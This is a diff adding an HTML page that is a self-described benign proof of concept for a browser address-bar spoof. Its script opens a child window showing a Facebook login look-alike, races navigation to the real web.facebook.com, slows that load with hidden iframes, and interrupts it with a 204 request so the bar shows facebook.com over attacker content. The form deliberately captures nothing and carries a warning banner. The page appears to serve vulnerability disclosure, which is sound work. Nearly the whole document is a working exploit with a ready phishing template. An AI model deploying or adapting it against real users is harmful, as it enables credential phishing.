@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>google.com</title>
+<style>
+ body{font-family:-apple-system,system-ui,Arial,sans-serif;padding:16px;line-height:1.5;color:#111}
+ a#test{font-size:18px;color:#1877f2}
+ pre{background:#f4f4f7;border:1px solid #dcdce2;border-radius:6px;padding:8px;font-size:11px;white-space:pre-wrap;word-break:break-all}
+ .warn{color:#b23;font-size:12px}
+</style>
+</head>
+<body>
+ <p>Authorized benign PoC — navigation-race / optimistic-URL spoof. Tap the link:</p>
+ <a id="test" href="https://web.facebook.com/" onclick="foo();return false;">https://web.facebook.com/</a>
+ <pre id="log">log:</pre>
+ <p class="warn">Benign: NO credentials are read or stored. Proof = attacker page shown while bar shows facebook.com.</p>
+
+<script>
+ var w, t, z, i, iframe;
+ function log(m){try{var L=document.getElementById('log');if(L)L.textContent=m+'\n'+L.textContent;}catch(e){}}
+
+ // ?fake  ->  render a BENIGN look-alike (no credential capture)
+ if (location.href.indexOf("fake") !== -1) {
+   document.title = "Facebook - Masuk";
+   document.body.innerHTML = `<!DOCTYPE html><html lang="id"><head><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Facebook - Masuk</title>
+<style>*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}
+body{background:#fff;color:#1c1e21;line-height:1.34}.container{max-width:480px;margin:0 auto;padding:20px;min-height:100vh;display:flex;flex-direction:column;justify-content:space-between}
+header{text-align:center;margin-bottom:40px}.banner{background:#fff3cd;border:1px solid #ffe08a;color:#7a5b00;font-size:13px;padding:10px;border-radius:6px;margin-bottom:20px}
+.logo{width:90px;height:90px;margin:0 auto 30px;background:#1877f2;border-radius:50%;display:flex;align-items:center;justify-content:center;color:#fff;font-size:60px;font-weight:bold}
+form{background:#fff;padding:20px;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1),0 8px 16px rgba(0,0,0,.1)}
+input{width:100%;padding:14px 16px;margin-bottom:12px;border:1px solid #dddfe2;border-radius:6px;font-size:16px}
+.login-btn{width:100%;padding:14px;background:#1877f2;color:#fff;font-size:18px;font-weight:bold;border:none;border-radius:6px;margin:16px 0}
+#proof{font-size:11px;color:#b23;word-break:break-all;margin-top:12px}
+footer{text-align:center;margin-top:40px;font-size:14px;color:#8a8d91}</style></head>
+<body><div class="container"><div>
+<header>
+ <div class="banner"><b>BENIGN SPOOF TEST</b><br>This page is <span id="realorigin"></span><br>NOT https://web.facebook.com/ &mdash; check the address bar above.</div>
+ <div class="logo">f</div>
+</header>
+<form id="loginForm">
+ <input type="text" id="username" placeholder="Mobile number or Email">
+ <input type="password" id="password" placeholder="Password">
+ <button type="submit" class="login-btn">Login</button>
+ <div id="proof"></div>
+</form>
+</div><footer><span>&#8734; Meta</span></footer></div>
+<script>
+ document.getElementById('realorigin').textContent = location.origin + location.pathname;
+ document.getElementById('loginForm').addEventListener('submit', function(ev){
+   ev.preventDefault();
+   // BENIGN: never read/store the password. Prove the spoof via origin only.
+   document.getElementById('proof').textContent =
+     'BENIGN SPOOF TEST — no credentials captured. If the bar shows web.facebook.com while this is ' +
+     'origin=' + location.origin + ' domain=' + document.domain + '  =>  address-bar spoof confirmed.';
+ });
+<\/script></body></html>`;
+ }
+
+ function foo(){
+   document.getElementById("test").href = "#";
+   w = window.open("?fake");
+   if(!w){ log('popup blocked — FB/IG may block window.open'); return; }
+   log('opened child ?fake (attacker content). polling…');
+   t = setInterval(bar, 1);
+ }
+
+ function bar(){
+   try{
+     if (w.location.href !== "about:blank") {
+       log('child left about:blank -> navigating child to REAL facebook (bar should show facebook)');
+       document.body.innerHTML = "<h1>Redirecting…</h1>";
+       slow();
+       w.location.href = "https://web.facebook.com/";
+       clearInterval(t);
+       z = setInterval(baz, 1);
+     }
+   }catch(e){ clearInterval(t); }
+ }
+
+ function baz(){
+   try{
+     // reading cross-origin href throws once child committed to facebook.com
+     var _ = w.location.href;
+     void _;
+   }catch(e){
+     // child now cross-origin (bar = facebook). Interrupt load with a 204 beacon
+     // so the committed URL stays while attacker content (hopefully) remains.
+     try{ w.location.href = "https://www.google.com/csi"; }catch(_){}
+     clearInterval(z);
+     log('interrupted with 204 (google.com/csi). CHECK child: does bar show web.facebook.com while content = BENIGN SPOOF TEST?');
+   }
+ }
+
+ // slow the real facebook load so the race window is wider
+ function slow(){
+   for (i = 0; i < 10; i++){
+     iframe = document.createElement("iframe");
+     iframe.src = "https://web.facebook.com/";
+     iframe.style = "display:none";
+     document.body.appendChild(iframe);
+   }
+ }
+</script>
+</body>
+</html>
